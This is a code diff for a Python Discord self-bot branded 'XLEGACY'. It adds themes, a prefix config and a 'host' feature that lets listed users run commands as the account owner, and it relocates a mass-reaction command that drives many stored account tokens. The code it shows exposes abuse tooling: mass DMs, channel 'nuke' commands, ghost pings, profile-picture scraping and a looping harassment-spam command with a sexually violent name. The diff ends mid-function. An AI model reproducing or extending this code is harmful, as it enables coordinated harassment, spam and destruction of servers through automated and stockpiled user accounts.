@@ -1,7 +1,7 @@
-import warnings
-warnings.filterwarnings("ignore")
+
 
 import discord
+import platform
 import aiofiles
 from discord.ext import commands
 import asyncio
@@ -19,12 +19,53 @@ import os
 import re
 import base64
 import nacl
+import subprocess
 import requests
 import io
+import timedelta
 import time
 from itertools import islice
 from datetime import datetime
 
+# Add these with your other global variables at the top
+current_theme = "red"  # Default theme
+themes = {
+    "red": {
+        "primary": "\033[31m",      # red
+        "secondary": "\033[91m",    # light_red  
+        "accent": "\033[30m",       # black
+        "name": "Red Theme"
+    },
+    "green": {
+        "primary": "\033[32m",      # green
+        "secondary": "\033[92m",    # light_green
+        "accent": "\033[30m",       # black
+        "name": "Green Theme"
+    },
+    "purple": {
+        "primary": "\033[35m",      # magenta/purple
+        "secondary": "\033[95m",    # light_magenta
+        "accent": "\033[30m",       # black
+        "name": "Purple Theme"
+    },
+    "blue": {
+        "primary": "\033[34m",      # blue
+        "secondary": "\033[94m",    # light_blue
+        "accent": "\033[30m",       # black
+        "name": "Blue Theme"
+    },
+    "cyan": {
+        "primary": "\033[36m",      # cyan
+        "secondary": "\033[96m",    # light_cyan
+        "accent": "\033[30m",       # black
+        "name": "Cyan Theme"
+    }
+}
+
+
+
+import warnings
+warnings.simplefilter("ignore", SyntaxWarning)
 
 CONFIG_FILE_PATH = "multicast_config.json"
 
@@ -114,16 +155,145 @@ light_magenta = "\033[95m"
 light_cyan = "\033[96m"  
 light_red = "\033[91m"  
 light_blue = "\033[94m"  
-accent_color = "\033[91"
+accent_color = "\033[91m"
+
+# Add these with your other global variables at the top
+PREFIX_CONFIG_FILE = "prefix_config.json"
+
+# Load prefix from config file or use default
+def load_prefix():
+    """Load prefix from config file or return default"""
+    try:
+        if os.path.exists(PREFIX_CONFIG_FILE):
+            with open(PREFIX_CONFIG_FILE, 'r') as f:
+                config = json.load(f)
+                return config.get("prefix", ".")
+        else:
+            # Create default config
+            save_prefix(".")
+            return "."
+    except:
+        return "."
+
+def save_prefix(new_prefix):
+    """Save prefix to config file"""
+    try:
+        with open(PREFIX_CONFIG_FILE, 'w') as f:
+            json.dump({"prefix": new_prefix}, f)
+        return True
+    except:
+        return False
+
+# Initialize prefix
+PREFIX = load_prefix()
+
+# Update bot command prefix
+bot = commands.Bot(command_prefix=PREFIX, self_bot=True)
+
+# Add these with your other global variables at the top
+HOST_CONFIG_FILE = "host_config.json"
+hosted_users = {}
+host_clients = {}
+# Add these with your other global variables at the top
+HOST_CONFIG_FILE = "host_config.json"
+hosted_users = {}
+host_clients = {}
+hosted_command_handlers = {}
 
 
+def save_hosted_users():
+    """Save hosted users mapping to HOST_CONFIG_FILE."""
+    try:
+        with open(HOST_CONFIG_FILE, 'w') as f:
+            json.dump(hosted_users, f, indent=2)
+        return True
+    except Exception as e:
+        try:
+            print(f"{theme_primary}Error saving host config: {e}{reset}")
+        except Exception:
+            print("Error saving host config: ", e)
+        return False
 
-PREFIX = "."
-TOKEN = "your_token_duh"
 
-bot = commands.Bot(command_prefix= PREFIX, self_bot=True)
+def load_hosted_users():
+    """Load hosted users from HOST_CONFIG_FILE."""
+    global hosted_users
+    try:
+        if os.path.exists(HOST_CONFIG_FILE):
+            with open(HOST_CONFIG_FILE, 'r') as f:
+                hosted_users = json.load(f)
+        else:
+            hosted_users = {}
+            save_hosted_users()
+    except Exception as e:
+        try:
+            print(f"{theme_primary}Error loading host config: {e}{reset}")
+        except Exception:
+            print("Error loading host config: ", e)
+        hosted_users = {}
 
 
+# Load hosted users on startup
+load_hosted_users()
+
+
+@bot.group(name='host', invoke_without_command=True)
+async def host(ctx):
+    """Host group to manage hosted users."""
+    await ctx.send(f"```ansi\n{theme_primary}Host management commands:{reset}\n\n{theme_secondary}{PREFIX}host add <@user> - Add a hosted user\n{theme_secondary}{PREFIX}host remove <@user> - Remove a hosted user\n{theme_secondary}{PREFIX}host list - List hosted users{reset}\n```")
+
+
+@host.command(name='add')
+async def host_add(ctx, user: discord.User):
+    """Add a user to the hosted list."""
+    if ctx.author != bot.user:
+        await ctx.send(f"```ansi\n{theme_primary}Unauthorized - only the host owner can manage hosted users{reset}\n```")
+        return
+    try:
+        hosted_users[str(user.id)] = True
+        save_hosted_users()
+        await ctx.send(f"```ansi\n{theme_primary}Added hosted user: {user.name} ({user.id}){reset}\n```")
+    except Exception as e:
+        await ctx.send(f"```ansi\n{theme_primary}Failed to add hosted user: {e}{reset}\n```")
+
+
+@host.command(name='remove')
+async def host_remove(ctx, user: discord.User):
+    """Remove a user from the hosted list."""
+    if ctx.author != bot.user:
+        await ctx.send(f"```ansi\n{theme_primary}Unauthorized - only the host owner can manage hosted users{reset}\n```")
+        return
+    try:
+        if str(user.id) in hosted_users:
+            del hosted_users[str(user.id)]
+            save_hosted_users()
+            await ctx.send(f"```ansi\n{theme_primary}Removed hosted user: {user.name} ({user.id}){reset}\n```")
+        else:
+            await ctx.send(f"```ansi\n{theme_primary}User is not hosted: {user.name}{reset}\n```")
+    except Exception as e:
+        await ctx.send(f"```ansi\n{theme_primary}Failed to remove hosted user: {e}{reset}\n```")
+
+
+@host.command(name='list')
+async def host_list(ctx):
+    """List all hosted users."""
+    if ctx.author != bot.user:
+        await ctx.send(f"```ansi\n{theme_primary}Unauthorized - only the host owner can list hosted users{reset}\n```")
+        return
+    try:
+        if not hosted_users:
+            await ctx.send(f"```ansi\n{theme_primary}No hosted users configured{reset}\n```")
+            return
+        lines = []
+        for uid in list(hosted_users.keys()):
+            try:
+                u = await bot.fetch_user(int(uid))
+                lines.append(f"{u.name} ({uid})")
+            except Exception:
+                lines.append(f"Unknown User ({uid})")
+        await ctx.send(f"```ansi\n{theme_primary}Hosted users:\n\n{theme_secondary}" + "\n".join(lines) + f"{reset}\n```")
+    except Exception as e:
+        await ctx.send(f"```ansi\n{theme_primary}Failed to list hosted users: {e}{reset}\n```")
 
 # Load tokens from file
 def load_tokens():
@@ -161,10 +331,9 @@ def load_outlast_messages():
         except Exception as e:
             print(f"Could not create file: {e}")
             return default_messages
-    except Exception as e:
-        print(f"Error loading outlast messages: {e}")
-        return ["Error loading messages"]
-    
+        except Exception as e:
+            print(f"Error loading outlast messages: {e}")
+            return ["Error loading messages"]
 @bot.event
 async def on_ready():
     import shutil
@@ -172,18 +341,18 @@ async def on_ready():
     # Get terminal width for centering
     terminal_width = shutil.get_terminal_size().columns
     
-    # Define colors
-    yyy = red  # Main text color
-    mkk = black  # Box color
-    www = reset  # Reset color
+    # Use theme colors
+    yyy = theme_primary  # Main text color
+    mkk = theme_accent   # Box color
+    www = reset          # Reset color
     
-    # Banner text
+    # Banner text - FIXED ESCAPE SEQUENCES
     banner_lines = [
     f"{yyy}___  _ _     _____ _____ ____  ____ ___  _{www}",
-    rf"{yyy}\  \/// \   /  __//  __//  _ \/   _\\  \//{www}",
-    rf"{yyy} \  / | |   |  \  | |  _| / \||  /   \  / {www}",
-    rf"{yyy} /  \ | |_/\|  /_ | |_//| |-|||  \__ / /  {www}",
-    rf"{yyy}/__/\\\____/\____\\____\\_/ \|\____//_/   {www}",
+    f"{yyy}\\  \\/// \\   /  __//  __//  _ \\/   _\\\\  \\//{www}",
+    f"{yyy} \\  / | |   |  \\  | |  _| / \\||  /   \\  / {www}",
+    f"{yyy} /  \\ | |_/\\|  /_ | |_//| |-|||  \\__ / /  {www}",
+    f"{yyy}/__/\\\\\\____/\\____\\\\____\\\\_/ \\|\\____//_/   {www}",
     f"{mkk}╔═════════════════════════════════════╗{www}",
     f"{mkk}║           {yyy}XLEGACY SELFBOT{mkk}             ║{www}",
     f"{mkk}║          {yyy}By @unholxy{mkk}                 ║{www}",
@@ -198,6 +367,8 @@ async def on_ready():
     server_count = f"Servers: {len(bot.guilds)}".ljust(36)
     friend_count = f"Friends: {len([f for f in bot.user.friends])}".ljust(36)
     token_count = f"Tokens: {len(load_tokens())}".ljust(36)
+    hosted_count = f"Hosted: {len(hosted_users)}".ljust(36)
+    theme_info = f"Theme: {themes[current_theme]['name']}".ljust(36)
     
     info_box = [
         f"{yyy}╔{border_line}╗{www}",
@@ -207,6 +378,8 @@ async def on_ready():
         f"{yyy}║ {server_count} {yyy}║{www}",
         f"{yyy}║ {friend_count} {yyy}║{www}",
         f"{yyy}║ {token_count} {yyy}║{www}",
+        f"{yyy}║ {hosted_count} {yyy}║{www}",
+        f"{yyy}║ {theme_info} {yyy}║{www}",
         f"{yyy}╚{border_line}╝{www}"
     ]
     
@@ -253,10 +426,18 @@ async def on_ready():
     print("\n" * 2)  # Add some space
     for line in spider_art:
         centered_line = line.center(terminal_width)
-        print(f"{red}{centered_line}{reset}")
+        print(f"{theme_primary}{centered_line}{reset}")
 
     # STARTING THE BOT
+    print(f"\n{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}")
+    print(f"{theme_primary} XLEGACY SELFBOT READY | PREFIX: {PREFIX} | THEME: {themes[current_theme]['name']} {reset}")
+    print(f"{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}")
+    print(f"{theme_secondary}Loaded {theme_primary}{len(load_tokens())}{theme_secondary} tokens from token.txt{reset}")
+    print(f"{theme_secondary}Loaded {theme_primary}{len(hosted_users)}{theme_secondary} hosted users from host_config.json{reset}")
+    print(f"{theme_secondary}Type {theme_primary}{PREFIX}menu{theme_secondary} to see available commands{reset}")
+    print(f"{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}")
 
+    
 @bot.command()
 async def menu(ctx):
     await ctx.send(f"""```ansi
@@ -265,7 +446,7 @@ async def menu(ctx):
                            {red} ──────────────────── XLEGACY |  MADE BY @unholxy {light_red} V.1 ────────────────────
                 {black}─────────────────────────────────────Selfbot─────────────────────────{red}
 
-   ⠀⠀⠀⠀⠀ ⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⣆⠀⠀⠀⠀⠀⠀⠀
+          ⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⣆⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⣼⠃⠀⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠸⣧⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⣸⡇⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⢸⣇⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⢰⡿⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⢿⡆⠀⠀⠀⠀
@@ -291,12 +472,11 @@ async def menu(ctx):
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
-{light_red}[ {light_red}.main {light_red}] {red}Multi Main          {black}[ {light_red}.chatpack {black}] {red}Misc/chatpack        
-{black}[ {light_red}.misc {black}] {red}More Misc           {light_red}[ {light_red}.autocmd {light_red}] {red}Auto Cmds/Afk       
-{light_red}[ {light_red}.spotify {light_red}] {red}Spotify Control     {black}[ {light_red}.account {black}] {red}Account      
-{light_red}[ {light_red}.nsfw {light_red}] {red}NSFW               {black}[ {light_red}.settings {black}] {red}Settings
-{light_red}[ {light_red}.ab {light_red}] {red}Auto Beef          {black}[ {light_red}.am {black}] {red}Auto Multi       
-
+{light_red}[ {light_red}.main {light_red}] {red}Multi Main	{black}[ {light_red}.chatpack {black}] {red}Misc/chatpack
+{black}[ {light_red}.misc {black}] {red}More Misc	{light_red}[ {light_red}.autocmd {light_red}] {red}Auto Cmds/Afk
+{light_red}[ {light_red}.spotify {light_red}] {red}Spotify Control	{black}[ {light_red}.account {black}] {red}Account
+{light_red}[ {light_red}.nsfw {light_red}] {red}NSFW	{black}[ {light_red}.settings {black}] {red}Settings
+{light_red}[ {light_red}.ab {light_red}] {red}Auto Beef	{black}[ {light_red}.multi {black}] {red}Multi-token
 
     ```
 """)
@@ -306,7 +486,7 @@ async def menu(ctx):
 @bot.command()
 async def main(ctx):
     msg = await ctx.send(f"```ansi\n{red} XLEGACY | MULTI MAIN {reset}\n```")
-    help_content = f"""
+    help_content = fr"""
                 {black}─────────────────────────────────────XLEGACY─────────────────────────
                            {red} ──────────────────── XLEGACY |  MADE BY @unholxy {light_red} V.1 ────────────────────
                 {black}─────────────────────────────────────Selfbot─────────────────────────{red}
@@ -701,156 +881,13 @@ async def vcstop(ctx):
     active_clients.clear()
     await ctx.send(f"```ansi\n{red}Disconnected {disconnected_count} voice clients```")
 
-    # Add these with your other global variables at the top
-active_reaction_tasks = []
-reactm_running = {}
-reactm_tasks = {}
-@bot.command()
-async def reactm(ctx, emoji: str, user: discord.Member):
-    """Mass react to a user's messages with multiple tokens"""
-    global reactm_running
-    channel_id = ctx.channel.id
-    user_id = user.id
-
-    if (user_id, channel_id) in reactm_running:
-        await ctx.send(f"```ansi\n{red} XLEGACY | REACTION SESSION ALREADY RUNNING |  {reset}\n```")
-        return
-
-    try:
-        with open('token.txt', 'r') as f:
-            all_tokens = [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        await ctx.send(f"```ansi\n{red} XLEGACY | NO TOKENS FOUND |  {reset}\n```")
-        return
-
-    active_tokens = []
-
-    async def check_token_presence(token):
-        headers = {
-            'Authorization': token,
-            'Content-Type': 'application/json'
-        }
-        async with aiohttp.ClientSession() as session:
-            async with session.get(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as resp:
-                if resp.status == 200:
-                    active_tokens.append(token)
-                    print(f"{red}Token {token[-4:]} is active in the server{reset}")
-                else:
-                    print(f"{light_red}Token {token[-4:]} is not in the server{reset}")
-
-    await asyncio.gather(*[check_token_presence(token) for token in all_tokens])
-
-    if not active_tokens:
-        await ctx.send(f"```ansi\n{red} XLEGACY | NO ACTIVE TOKENS IN SERVER |  {reset}\n```")
-        return
-
-    await ctx.send(f"```ansi\n{red} XLEGACY | FOUND {len(active_tokens)} ACTIVE TOKENS | CHOOSE HOW MANY TO USE |  {reset}\n```")
     
-    def check(m):
-        return m.author == ctx.author and m.channel == ctx.channel
-
-    try:
-        token_response = await bot.wait_for('message', timeout=30.0, check=check)
-        if token_response.content.lower() == 'all':
-            tokens = active_tokens
-        else:
-            try:
-                token_count = int(token_response.content)
-                if token_count < 1 or token_count > len(active_tokens):
-                    await ctx.send(f"```ansi\n{red} XLEGACY | INVALID NUMBER | CHOOSE 1-{len(active_tokens)} |  {reset}\n```")
-                    return
-                tokens = active_tokens[:token_count]
-            except ValueError:
-                await ctx.send(f"```ansi\n{red} XLEGACY | INVALID INPUT | ENTER NUMBER OR 'ALL' |  {reset}\n```")
-                return
-    except asyncio.TimeoutError:
-        await ctx.send(f"```ansi\n{red} XLEGACY | TIMEOUT | NO RESPONSE RECEIVED |  {reset}\n```")
-        return
-
-    async def reaction_task(token):
-        headers = {
-            'Authorization': token,
-            'Content-Type': 'application/json',
-            'accept': '*/*',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'origin': 'https://discord.com',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-        }
-
-        async def add_reaction(message_id):
-            try:
-                url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me'
-                async with aiohttp.ClientSession() as session:
-                    async with session.put(url, headers=headers) as resp:
-                        if resp.status == 204:  
-                            print(f"{red}Token {token[-4:]} reacted to message{reset}")
-                            return True
-                        elif resp.status == 429: 
-                            retry_after = float((await resp.json()).get('retry_after', 1))
-                            print(f"{light_red}Rate limited with token {token[-4:]}, waiting {retry_after}s{reset}")
-                            await asyncio.sleep(retry_after)
-                            return False
-                        else:
-                            print(f"{light_red}Failed to react with token {token[-4:]}: Status {resp.status}{reset}")
-                            await asyncio.sleep(1)
-                            return False
-            except Exception as e:
-                print(f"{light_red}Error adding reaction with token {token[-4:]}: {e}{reset}")
-                await asyncio.sleep(1)
-                return False
-
-        while (user_id, channel_id) in reactm_running:
-            try:
-                async for message in ctx.channel.history(limit=1):
-                    if message.author.id == user_id and message.id:
-                        success = await add_reaction(message.id)
-                        if not success: 
-                            await asyncio.sleep(0.5)
-                await asyncio.sleep(0.5) 
-            except Exception as e:
-                print(f"{light_red}Error in reaction loop for token {token[-4:]}: {e}{reset}")
-                await asyncio.sleep(1)
-
-    reactm_running[(user_id, channel_id)] = True
-    tasks = []
-    
-    for token in tokens:
-        task = asyncio.create_task(reaction_task(token))
-        tasks.append(task)
-        active_reaction_tasks.append(task)
-    
-    reactm_tasks[(user_id, channel_id)] = tasks
-    
-    await ctx.send(f"```ansi\n{red} XLEGACY | REACTING WITH {emoji} TO {user.name} USING {len(tokens)} TOKENS |  {reset}\n```")
-
-@bot.command()
-async def reactoff(ctx):
-    """Stop all mass reaction sessions in current channel"""
-    channel_id = ctx.channel.id
-    stopped = False
-
-    for (user_id, chan_id), tasks in list(reactm_tasks.items()):
-        if chan_id == channel_id:
-            reactm_running.pop((user_id, chan_id), None)
-            for task in tasks:
-                task.cancel()
-            reactm_tasks.pop((user_id, chan_id))
-            stopped = True
-
-    if stopped:
-        await ctx.send(f"```ansi\n{red} XLEGACY | STOPPED ALL REACTION SESSIONS |  {reset}\n```")
-    else:
-        await ctx.send(f"```ansi\n{red} XLEGACY | NO REACTION SESSIONS RUNNING |  {reset}\n```")
 
 
 @bot.command()
 async def nsfw(ctx):
     msg = await ctx.send(f"```ansi\n{red} XLEGACY | NSFW COMMANDS {reset}\n```")
-    help_content = f"""
+    help_content = fr"""
                 {black}─────────────────────────────────────XLEGACY─────────────────────────
                            {red} ──────────────────── XLEGACY |  MADE BY @unholxy {light_red} V.1 ────────────────────
                 {black}─────────────────────────────────────NSFW─────────────────────────{red}
@@ -875,7 +912,6 @@ async def nsfw(ctx):
 
 """
     await msg.edit(content=f"```ansi\n{help_content}\n```")
-# NSFW Commands
 @bot.command(name="ecchi")
 async def ecchi(ctx, member: discord.Member = None):
     async with aiohttp.ClientSession() as session:
@@ -968,7 +1004,7 @@ async def marin(ctx, member: discord.Member = None):
 @bot.command()
 async def misc(ctx):
     msg2 = await ctx.send("Loading.")
-    help_content2 = f"""
+    help_content2 = fr"""
 {red}User Interaction{reset}
 {light_red}[ {red}42{light_red} ] {black}pfpscrape <num>    {light_red}[ {red}43{light_red} ] {black}triggertyping <dur> {light_red}[ {red}44{light_red} ] {black}triggertypingoff
 {light_red}[ {red}45{light_red} ] {black}ghostping <@user>  {light_red}[ {red}46{light_red} ] {black}ghostrole          {light_red}[ {red}47{light_red} ] {black}token
@@ -993,9 +1029,10 @@ async def misc(ctx):
 """
 
 @bot.command()
+
 async def scrapeconfig(ctx):
     """View and manage scraped PFP folders"""
-    base_dir = r'C:\Users\weluv\OneDrive\Desktop\selfbot\main.py'
+    base_dir = r'selfbot\main.py'
     
     if not os.path.exists(base_dir):
         await ctx.send(f"```ansi\n{red} XLEGACY | NO PFP FOLDER FOUND |  {reset}\n```")
@@ -1030,7 +1067,7 @@ async def scrapeconfig(ctx):
     # Split into pages if too long
     page_content = "\n".join(folder_list)
     
-    help_content = f"""
+    help_content = fr"""
 {red}SCRAPED PFP FOLDERS{reset}
 
 {page_content}
@@ -1105,7 +1142,7 @@ async def scrapeconfig(ctx):
 @bot.command()
 async def scrapedelete(ctx, folder_name: str = None):
     """Delete specific scraped PFP folders"""
-    base_dir = r'C:\Users\weluv\OneDrive\Desktop\selfbot\pfps'
+    base_dir = r'\selfbot\pfps'
     
     if not os.path.exists(base_dir):
         await ctx.send(f"```ansi\n{red} XLEGACY | NO PFP FOLDER FOUND |  {reset}\n```")
@@ -1129,7 +1166,7 @@ async def scrapedelete(ctx, folder_name: str = None):
             file_count = len([f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))])
             folder_list.append(f"{light_red}[ {red}{i}{light_red} ] {black}{folder} - {red}{file_count}{black} files{reset}")
         
-        content = f"""
+        content = fr"""
 {red}AVAILABLE FOLDERS TO DELETE{reset}
 
 {"\n".join(folder_list)}
@@ -1174,8 +1211,25 @@ async def autoreact(ctx, user: discord.User, emoji: str):
 
 @bot.event
 async def on_message(message):
-    # Process commands first
-    await bot.process_commands(message)
+    # Process commands differently for owner vs hosted users
+    try:
+        if message.author == bot.user:
+            await bot.process_commands(message)
+            return
+
+        # If a hosted user sent the message and it looks like a command, invoke it directly
+        if (str(message.author.id) in hosted_users) or (message.author.id in hosted_users):
+            ctx = await bot.get_context(message)
+            if ctx.command:
+                # Execute the command as the bot owner so hosted users can access owner-only commands
+                ctx.author = bot.user
+                await bot.invoke(ctx)
+                return
+
+        # Default processing for other messages
+        await bot.process_commands(message)
+    except Exception as e:
+        print(f"{light_red}Error in on_message: {e}{reset}")
     
     # Check if autoreact is enabled for this user
     if message.author.id in autoreact_users:
@@ -1198,6 +1252,43 @@ async def on_message(message):
                 print(f"{light_red}Failed to autoreact: {e}{reset}")
         except Exception as e:
             print(f"{light_red}Error in autoreact: {e}{reset}")
+
+        # (Hosted invocations are handled above) - no need to double-invoke
+
+
+    async def _delayed_delete_message(message, delay=3):
+        """Delete a provided message after a delay, ignoring failures."""
+        try:
+            await asyncio.sleep(delay)
+            await message.delete()
+        except Exception:
+            return
+
+
+    @bot.event
+    async def on_command_completion(ctx):
+        """After a command completes, schedule deletion of any bot-sent messages in the channel that were created after the invoking user message."""
+        try:
+            # Look for bot messages sent after the command invocation and delete them after a small delay
+            # Also schedule deletion of the invoking message if it was authored by the bot (so the owner's command disappears)
+            if ctx.message.author == bot.user:
+                asyncio.create_task(_delayed_delete_message(ctx.message, 3))
+            # Try to delete hosted user command messages if the bot has permissions
+            try:
+                if ((str(ctx.message.author.id) in hosted_users) or (ctx.message.author.id in hosted_users)) and ctx.guild is not None:
+                    perms = ctx.channel.permissions_for(ctx.guild.me)
+                    if perms and perms.manage_messages:
+                        asyncio.create_task(_delayed_delete_message(ctx.message, 3))
+            except Exception:
+                pass
+
+            async for message in ctx.channel.history(limit=25, after=ctx.message.created_at):
+                if message.author == bot.user:
+                    # don't block the event loop - schedule deletion
+                    asyncio.create_task(_delayed_delete_message(message, 3))
+        except Exception:
+            # Just ignore any failures here
+            pass
 @bot.command()
 async def autoreactoff(ctx, user: discord.User):
     if user.id in autoreact_users:
@@ -1462,7 +1553,7 @@ async def serverinfo(ctx):
     boost_level = server.premium_tier
     information_field = f"                                {red}Verification: {white}{verification_level}\n                                {red}Boost level: {white}{boost_level}\n                                {red}Boosts: {white}{total_boosters}"
 
-    response = f"""```ansi
+    response = fr"""```ansi
 {red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                 {red}Server Name: {white}{server.name}
                                 {red}Created On: {white}{formatted_creation}
@@ -1500,7 +1591,7 @@ async def userinfo(ctx, member: discord.Member = None):
 
     joined_date = member.joined_at.strftime('%Y-%m-%d') if member.joined_at else "N/A"
    
-    response = f"""```ansi
+    response = fr"""```ansi
 {red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                 {red}User Name: {white}{member.name}
                                 {red}User ID: {white}{member.id}
@@ -1752,7 +1843,7 @@ async def roblox(ctx, *, username: str):
             time_ago = "Unknown"
 
         # Create embed-like message with avatar
-        response_text = f"""```ansi
+        response_text = fr"""```ansi
 {red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                 {red}Roblox User: {white}{roblox_display_name} (@{roblox_name})
                                 {red}User ID: {white}{roblox_id}
@@ -1790,7 +1881,7 @@ async def fetch_anime_gif(action):
 @bot.command()
 async def fun(ctx):
     msg = await ctx.send("Loading.")
-    help_content = f"""
+    help_content = fr"""
 {red}Anime Interaction Commands{reset}
 {light_red}[ {red}1{light_red} ] {black}kiss <@user>       {light_red}[ {red}2{light_red} ] {black}slap <@user>       {light_red}[ {red}3{light_red} ] {black}hurt <@user>
 {light_red}[ {red}4{light_red} ] {black}pat <@user>        {light_red}[ {red}5{light_red} ] {black}wave <@user>       {light_red}[ {red}6{light_red} ] {black}hug <@user>
@@ -2574,7 +2665,7 @@ async def nukechannel(ctx, *, new_channel_name):
 
 @bot.command()
 async def nukeconfig(ctx):
-    config_message = f"""
+    config_message = fr"""
 {red}──────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                 {red}XLEGACY NUKE CONFIG{reset}
                                 {light_red}Webhook Message: {red}{configss['webhook_message']}{reset}
@@ -2847,7 +2938,7 @@ async def mdm(ctx, num_friends: int, *, message: str):
                 filled = int(progress / 100 * bar_length)
                 bar = "█" * filled + "░" * (bar_length - filled)
                 
-                status_display = f"""```ansi
+                status_display = fr"""```ansi
 {red} XLEGACY | MASS DM PROGRESS {reset}
 {red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
 {light_red}Progress: {red}[{bar}] {progress:.1f}%{reset}
@@ -2869,7 +2960,7 @@ async def mdm(ctx, num_friends: int, *, message: str):
                     await asyncio.sleep(random.uniform(8.0, 12.0))
                     
             final_time = time.time() - start_time
-            final_status = f"""```ansi
+            final_status = fr"""```ansi
 {red} XLEGACY | MASS DM COMPLETE {reset}
 {red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
 {light_red}Successful: {red}{stats['success']}{reset}
@@ -4853,7 +4944,7 @@ async def rape(ctx, user: discord.User):
     
     async def rape_loop():
         try:
-            with open(r'C:\Users\weluv\OneDrive\Desktop\selfbot\outlast_messages.txt', 'r', encoding='utf-8') as f:
+            with open(r'\selfbot\outlast_messages.txt', 'r', encoding='utf-8') as f:
                 messages = [line.strip() for line in f if line.strip()]
         except FileNotFoundError:
             await ctx.send(f"```ansi\n{red} XLEGACY | OUTLAST MESSAGES FILE NOT FOUND |  {reset}\n```")
@@ -5410,7 +5501,7 @@ async def rpcall(ctx, *, message: str):
 light_magenta = "\033[38;5;13m"
 
 import sys
-bye = f"""
+bye = fr"""
 
 ⠀⠀⠀⠀⠀⠀{red}
  __   ___      ______ _____          _______     __
@@ -5423,7 +5514,6 @@ bye = f"""
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{red}Restarting Selfbot⠀⠀⠀
 {cyan}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
 """
-
 @bot.command()
 async def reload(ctx):
     themed_bye = bye.replace(light_magenta, red)
@@ -5448,5 +5538,1178 @@ async def reload(ctx):
         await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO RESTART SELFBOT |  {reset}\n```")
         print(f"Error restarting selfbot: {e}")
 
+# Add these with your other global variables
+active_reaction_tasks = []
+reactm_running = {}
+reactm_tasks = {}
 
-bot.run(TOKEN, bot=False)
+
+@bot.command(aliases=['reactm'])
+async def mreact(ctx, emoji: str, user: discord.Member):
+    """Mass react to a user's messages with multiple tokens"""
+    global reactm_running, reactm_tasks, active_reaction_tasks
+    channel_id = ctx.channel.id
+    user_id = user.id
+
+    if (user_id, channel_id) in reactm_running:
+        await ctx.send(f"```ansi\n{red} XLEGACY | REACTION SESSION ALREADY RUNNING |  {reset}\n```")
+        return
+
+    try:
+        with open('token.txt', 'r') as f:
+            all_tokens = [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        await ctx.send(f"```ansi\n{red} XLEGACY | NO TOKENS FOUND |  {reset}\n```")
+        return
+
+    active_tokens = []
+
+    async def check_token_presence(token):
+        headers = {
+            'Authorization': token,
+            'Content-Type': 'application/json'
+        }
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as resp:
+                if resp.status == 200:
+                    active_tokens.append(token)
+                    print(f"{red}Token {token[-4:]} is active in the server{reset}")
+                else:
+                    print(f"{light_red}Token {token[-4:]} is not in the server{reset}")
+
+    await asyncio.gather(*[check_token_presence(token) for token in all_tokens])
+
+    if not active_tokens:
+        await ctx.send(f"```ansi\n{red} XLEGACY | NO ACTIVE TOKENS IN SERVER |  {reset}\n```")
+        return
+
+    await ctx.send(f"```ansi\n{red} XLEGACY | FOUND {len(active_tokens)} ACTIVE TOKENS | CHOOSE HOW MANY TO USE |  {reset}\n```")
+    
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel
+
+    try:
+        token_response = await bot.wait_for('message', timeout=30.0, check=check)
+        if token_response.content.lower() == 'all':
+            tokens = active_tokens
+        else:
+            try:
+                token_count = int(token_response.content)
+                if token_count < 1 or token_count > len(active_tokens):
+                    await ctx.send(f"```ansi\n{red} XLEGACY | INVALID NUMBER | CHOOSE 1-{len(active_tokens)} |  {reset}\n```")
+                    return
+                tokens = active_tokens[:token_count]
+            except ValueError:
+                await ctx.send(f"```ansi\n{red} XLEGACY | INVALID INPUT | ENTER NUMBER OR 'ALL' |  {reset}\n```")
+                return
+    except asyncio.TimeoutError:
